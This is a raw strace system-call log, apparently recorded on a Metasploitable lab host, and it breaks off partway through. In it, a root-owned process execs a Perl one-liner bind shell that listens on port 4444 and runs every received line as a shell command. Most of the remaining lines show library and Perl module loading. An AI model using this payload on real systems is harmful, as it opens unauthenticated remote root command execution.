12644 20:28:53.651960 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12644 20:28:53.651971 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12644 20:28:53.652008 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12644 20:28:53.652029 stat64("/sbin/perl", 0xbffb0e38) = -1 ENOENT (No such file or directory)
12644 20:28:53.652041 stat64("/bin/perl", 0xbffb0e38) = -1 ENOENT (No such file or directory)
12644 20:28:53.652053 stat64("/usr/sbin/perl", 0xbffb0e38) = -1 ENOENT (No such file or directory)
12644 20:28:53.652064 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12644 20:28:53.652082 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12644 20:28:53.652107 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12644 20:28:53.652122 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7dfa6f8) = 12646
12646 20:28:53.771829 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12646 20:28:53.771863 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12646 20:28:53.771877 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12646 20:28:53.771889 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12646 20:28:53.771905 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12646 20:28:53.771921 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12646 20:28:53.771934 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12646 20:28:53.771974 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12646 20:28:53.772079 brk(0)            = 0x8153000
12646 20:28:53.772100 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772117 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f11000
12646 20:28:53.772134 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772152 open("/etc/ld.so.cache", O_RDONLY) = 1
12646 20:28:53.772165 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12646 20:28:53.772183 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f09000
12646 20:28:53.772194 close(1)          = 0
12646 20:28:53.772205 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772324 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12646 20:28:53.772340 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12646 20:28:53.772433 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12646 20:28:53.772452 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f05000
12646 20:28:53.772464 mmap2(0xb7f07000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f07000
12646 20:28:53.772482 close(1)          = 0
12646 20:28:53.772493 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772508 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12646 20:28:53.772522 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12646 20:28:53.772610 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12646 20:28:53.772627 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ee0000
12646 20:28:53.772639 mmap2(0xb7f03000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f03000
12646 20:28:53.772655 close(1)          = 0
12646 20:28:53.772667 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772684 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12646 20:28:53.772699 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12646 20:28:53.772786 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12646 20:28:53.772830 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7edf000
12646 20:28:53.772845 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec7000
12646 20:28:53.772871 mmap2(0xb7edb000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7edb000
12646 20:28:53.772886 mmap2(0xb7edd000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7edd000
12646 20:28:53.772901 close(1)          = 0
12646 20:28:53.772913 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.772927 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12646 20:28:53.772941 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12646 20:28:53.773030 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12646 20:28:53.773048 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d78000
12646 20:28:53.773059 mmap2(0xb7ec1000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ec1000
12646 20:28:53.773074 mmap2(0xb7ec4000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ec4000
12646 20:28:53.773088 close(1)          = 0
12646 20:28:53.773100 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12646 20:28:53.773113 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12646 20:28:53.773128 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12646 20:28:53.773220 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12646 20:28:53.773237 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d46000
12646 20:28:53.773249 mmap2(0xb7d4f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d4f000
12646 20:28:53.773263 mmap2(0xb7d51000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d51000
12646 20:28:53.773277 close(1)          = 0
12646 20:28:53.773484 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d45000
12646 20:28:53.773727 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d458c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12646 20:28:53.773892 mprotect(0xb7ec1000, 4096, PROT_READ) = 0
12646 20:28:53.773960 munmap(0xb7f09000, 29913) = 0
12646 20:28:53.773993 set_tid_address(0xb7d45908) = 12646
12646 20:28:53.774015 set_robust_list(0xb7d45910, 0xc) = 0
12646 20:28:53.774035 futex(0xbfd549f0, 0x81 /* FUTEX_??? */, 1) = 0
12646 20:28:53.774054 rt_sigaction(SIGRTMIN, {0xb7ecb2c0, [], SA_SIGINFO}, NULL, 8) = 0
12646 20:28:53.774067 rt_sigaction(SIGRT_1, {0xb7ecb340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12646 20:28:53.774080 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12646 20:28:53.774094 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12646 20:28:53.774114 uname({sys="Linux", node="metasploitable", ...}) = 0
12646 20:28:53.774161 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12646 20:28:53.774208 brk(0)            = 0x8153000
12646 20:28:53.774218 brk(0x8174000)    = 0x8174000
12646 20:28:53.774263 getuid32()        = 0
12646 20:28:53.774282 geteuid32()       = 0
12646 20:28:53.774316 getgid32()        = 0
12646 20:28:53.774339 getegid32()       = 0
12646 20:28:53.774377 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d24000
12646 20:28:53.774406 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12646 20:28:53.774424 read(1, "7\377(\35", 4) = 4
12646 20:28:53.774438 close(1)          = 0
12646 20:28:53.774456 time(NULL)        = 1495672133
12646 20:28:53.774499 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfd546c0) = -1 ENOENT (No such file or directory)
12646 20:28:53.774518 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfd546c0) = -1 ENOENT (No such file or directory)
12646 20:28:53.774531 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfd546c0) = -1 ENOENT (No such file or directory)
12646 20:28:53.774547 stat64("/usr/local/lib/perl/5.8.7", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774559 stat64("/usr/local/share/perl/5.8.7", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774572 stat64("/usr/local/lib/perl/5.8.6", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774584 stat64("/usr/local/share/perl/5.8.6", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774596 stat64("/usr/local/lib/perl/5.8.4", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774607 stat64("/usr/local/share/perl/5.8.4", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774625 stat64("/usr/local/lib/perl/5.8.3", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774637 stat64("/usr/local/share/perl/5.8.3", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774649 stat64("/usr/local/lib/perl/5.8.2", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774661 stat64("/usr/local/share/perl/5.8.2", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774673 stat64("/usr/local/lib/perl/5.8.1", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774684 stat64("/usr/local/share/perl/5.8.1", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774696 stat64("/usr/local/lib/perl/5.8.0", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774708 stat64("/usr/local/share/perl/5.8.0", 0xbfd54800) = -1 ENOENT (No such file or directory)
12646 20:28:53.774731 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd544f8) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.774745 _llseek(0, 0, [0], SEEK_CUR) = 0
12646 20:28:53.774757 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd544f8) = -1 EBADF (Bad file descriptor)
12646 20:28:53.774768 _llseek(1, 0, 0xbfd54540, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12646 20:28:53.774787 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd544f8) = -1 EINVAL (Invalid argument)
12646 20:28:53.774799 _llseek(2, 0, 0xbfd54540, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12646 20:28:53.774809 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12646 20:28:53.774823 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd545b8) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.774833 _llseek(1, 0, [0], SEEK_CUR) = 0
12646 20:28:53.774845 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12646 20:28:53.774857 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12646 20:28:53.774875 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12646 20:28:53.774929 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12646 20:28:53.774976 getppid()         = 12644
12646 20:28:53.775037 stat64("/etc/perl/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775051 stat64("/etc/perl/IO.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775064 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775077 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775091 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775103 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775117 stat64("/usr/lib/perl5/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775130 stat64("/usr/lib/perl5/IO.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775143 stat64("/usr/share/perl5/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775155 stat64("/usr/share/perl5/IO.pm", 0xbfd541bc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775168 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfd542ac) = -1 ENOENT (No such file or directory)
12646 20:28:53.775181 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12646 20:28:53.775202 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12646 20:28:53.775215 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53fc8) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.775227 _llseek(6, 0, [0], SEEK_CUR) = 0
12646 20:28:53.775251 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12646 20:28:53.775322 stat64("/etc/perl/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775336 stat64("/etc/perl/XSLoader.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.775350 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775363 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.775377 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775390 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.775404 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775416 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.775429 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775441 stat64("/usr/share/perl5/XSLoader.pm", 0xbfd53d0c) = -1 ENOENT (No such file or directory)
12646 20:28:53.775455 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfd53dfc) = -1 ENOENT (No such file or directory)
12646 20:28:53.775468 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12646 20:28:53.775489 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12646 20:28:53.775503 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd53b18) = -1 ENOTTY (Inappropriate ioctl for device)
12646 20:28:53.775514 _llseek(8, 0, [0], SEEK_CUR) = 0
12646 20:28:53.775533 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = 